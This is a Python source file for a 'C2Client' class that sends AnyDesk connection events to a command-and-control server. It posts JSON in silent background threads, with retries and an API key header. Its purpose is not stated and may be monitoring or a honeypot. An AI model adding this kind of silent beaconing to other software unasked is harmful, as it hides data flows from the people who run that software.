"""
C2 Client - HTTP client for logging events to the C2 server
Non-blocking with retry logic and silent failure
Includes API key authentication
"""

import json
import threading
import time
from datetime import datetime

try:
    import urllib.request
    import urllib.error
except ImportError:
    import urllib2 as urllib


# Constants for retry logic
MAX_RETRY_ATTEMPTS = 3
RETRY_BACKOFF_SECONDS = [1, 2, 4]  # Exponential backoff
REQUEST_TIMEOUT = 5  # seconds


class C2Client:
    """
    HTTP client for logging AnyDesk connection events to the C2 server.
    Non-blocking: Runs in background threads to avoid blocking main service.
    """

    def __init__(self, host, port, api_key, log_func=None):
        """
        Initialize the C2 client.

        Args:
            host: C2 server hostname or IP
            port: C2 server HTTP port
            api_key: API key for authentication
            log_func: Optional logging function
        """
        self._host = host
        self._port = port
        self._api_key = api_key
        self._log = log_func if log_func else lambda msg: None
        self._url = f"http://{host}:{port}/anydesk_event"
        self._enabled = True

    def log_event(self, event):
        """
        Log an event to the C2 server.
        Non-blocking: Runs in background thread.

        Args:
            event: Event dictionary containing event data
        """
        if not self._enabled:
            return

        # Run in background thread
        thread = threading.Thread(target=self._send_event, args=(event,), daemon=True, name="C2Client")
        thread.start()

    def _send_event(self, event):
        """
        Send event to C2 server with retry logic.
        Runs in background thread.
        """
        # Convert datetime to string if present
        payload = event.copy()
        if "timestamp" in payload and isinstance(payload["timestamp"], datetime):
            payload["timestamp"] = payload["timestamp"].strftime("%Y-%m-%d %H:%M:%S")

        # Convert to JSON
        json_data = json.dumps(payload).encode("utf-8")

        for attempt in range(MAX_RETRY_ATTEMPTS):
            try:
                # Create request with API key header
                req = urllib.request.Request(
                    self._url,
                    data=json_data,
                    headers={
                        "Content-Type": "application/json",
                        "User-Agent": "BlackholeC2Client/1.0",
                        "X-API-Key": self._api_key,  # API key authentication
                    },
                    method="POST",
                )

                # Send request
                with urllib.request.urlopen(req, timeout=REQUEST_TIMEOUT) as response:
                    if response.status == 200:
                        self._log(f"[C2_CLIENT] Event logged: {payload.get('event_type')}")
                        return
                    else:
                        self._log(f"[C2_CLIENT] Unexpected response: {response.status}")

            except urllib.error.URLError as e:
                if attempt < MAX_RETRY_ATTEMPTS - 1:
                    wait_time = RETRY_BACKOFF_SECONDS[attempt]
                    self._log(
                        f"[C2_CLIENT] Connection failed (attempt {attempt + 1}/{MAX_RETRY_ATTEMPTS}), retrying in {wait_time}s..."
                    )
                    time.sleep(wait_time)
                else:
                    self._log(f"[C2_CLIENT] Failed to log event after {MAX_RETRY_ATTEMPTS} attempts")
            except Exception as e:
                self._log(f"[C2_CLIENT] Error logging event: {e}")
                break

    def disable(self):
        """Disable C2 logging (for dev mode)"""
        self._enabled = False
        self._log("[C2_CLIENT] C2 logging disabled")

    def enable(self):
        """Enable C2 logging"""
        self._enabled = True
        self._log("[C2_CLIENT] C2 logging enabled")

    def is_enabled(self):
        """Check if C2 logging is enabled"""
        return self._enabled
